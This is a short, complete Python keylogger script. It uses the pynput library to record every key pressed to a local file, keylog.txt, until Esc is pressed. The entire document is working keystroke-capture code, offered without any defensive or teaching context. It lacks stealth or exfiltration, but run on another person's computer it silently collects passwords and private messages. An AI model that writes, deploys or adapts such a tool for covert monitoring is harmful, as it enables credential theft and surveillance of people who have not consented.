from pynput import keyboard

def on_press(key):
    """
    Logs the key pressed to a file.

    Args:
        key: The key pressed.
    """
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"{key}\n")

def on_release(key):
    """
    Stops the keylogger when the 'esc' key is pressed.

    Args:
        key: The key released.
    """
    if key == keyboard.Key.esc:
        return False

def main():
    """
    Starts the keylogger.
    """
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()